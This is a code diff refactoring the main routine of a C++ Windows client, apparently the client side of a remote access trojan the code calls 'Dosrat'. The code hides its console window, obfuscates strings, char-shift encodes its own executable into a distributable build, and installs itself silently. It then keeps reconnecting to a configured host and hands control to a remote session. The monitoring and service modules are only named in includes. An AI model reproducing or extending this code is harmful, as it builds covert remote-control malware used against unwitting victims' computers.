@@ -6,19 +6,27 @@
 #include <opencv2/opencv.hpp>
 #include <zlib.h>
 
-using json = nlohmann::json;
+using Json = nlohmann::json;
 using namespace cv;
 
 string Version = "2.0.0-b.6";
 int VersioneCompatibile = 4;
-bool DEBUG = false;
-
-#include "Classi.h"
-#include "Funzioni.h"
 
 using namespace std;
 
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
+#include "Debugger.hpp"
+
+Debugger debug;
+
+#include "Comunicazioni.hpp"
+#include "Settaggi.hpp"
+#include "Installer.hpp"
+#include "Monitor.hpp"
+#include "Services.hpp"
+#include "Sessione.hpp"
+
+int main()
+//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
     TcpIP Client;
     SystemUtils su;
@@ -27,37 +35,36 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     ConsoleUtils cu;
     Settaggi sett;
     EasyMSGB msgb;
-
-    if (du.CheckFile(du.GetModuleFilePath() + (string)AY_OBFUSCATE("DosratDebug")))
-        DEBUG = true;
+    Installer installer;
 
     AllocConsole();
-    if (!DEBUG)
+    if (!debug.Active)
         cu.HideConsole();
     else
+    {
         freopen_s((FILE**)stdout, "CONOUT$", "w", stdout);
+    }
 
     // Per generare la build del Client da distribuire
-    if (du.CheckFile(du.GetModuleFilePath() + "SetBuild"))
+    if (debug.MakeBuild)
     {
         en.CharShift(69, du.GetFullModuleFilePath(), du.GetModuleFilePath() + "ClientBuild.exe");
         return 0;
     }
 
     // Per test locali senza installazione
-    if (du.CheckFile(du.GetModuleFilePath() + "LocTest"))
+    if (debug.SkipInstall)
     {
         sett.Host = "127.0.0.1";
         sett.Porta = 6969;
     }
     else
     {
-        if (!IsInstalled())
+        if (!installer.IsInstalled())
         {
-            short rtn = InstallClient();
+            short rtn = installer.InstallClient();
 
-            if (DEBUG)
-                msgb.Ok("Codice installazione: " + to_string(rtn));
+            debug.log.Info("Codice installazione: " + to_string(rtn));
 
             return 0;
         }
@@ -108,15 +115,15 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     {
         while (!Client.Connect()) { Sleep(100); }
         
-        if (DEBUG)
-            cout << "Ricevuta connessione" << endl;
+        debug.log.Info("Ricevuta connessione");
 
         if (COMUNICAZIONI::Inizializzazione(Client.Sock))
         {
-            if (DEBUG)
-                cout << "Connessione accettata" << endl;
+            debug.log.Info("Connessione accettata");
 
-            switch (Sessione(Client))
+            Sessione s(Client.Sock);
+
+            switch (s.Start())
             {
                 case 0:
                     closesocket(Client.Sock);
@@ -129,8 +136,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
                     break;
             }
 
-            if (DEBUG)
-                cout << "Disconnesso" << endl;
+            debug.log.Info("Disconnesso");
         }
         Client.Stop();
         Client.StartClient();
